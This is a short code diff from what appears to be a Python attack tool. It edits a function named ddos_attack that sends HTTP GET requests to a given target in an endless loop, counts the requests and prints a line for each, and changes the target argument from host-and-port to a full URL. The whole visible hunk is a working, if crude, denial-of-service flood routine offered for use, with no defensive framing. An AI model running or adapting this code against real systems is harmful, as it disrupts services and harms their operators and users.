@@ -39,16 +39,16 @@ def ip_port_check(ip, port):
 
 attack_num = 0
 
-def ddos_attack(target, port=80): #beta
+def ddos_attack(target): #beta
     while True:
         try:
-            d = requests.get(f"http://{target}:{port}")
+            d = requests.get(target)
             global attack_num
             attack_num += 1
-            print(f'[{attack_num}] {target}:{port} is connected')
+            print(f'[{attack_num}] {target} is connected')
             d.close()
         except:
-            print(f'[-] ddos attack is stop because {target}:{port} is disconnected')
+            print(f'[-] ddos attack is stop because {target} is disconnected')
             pass
 
 #-------------------------download---------------------------
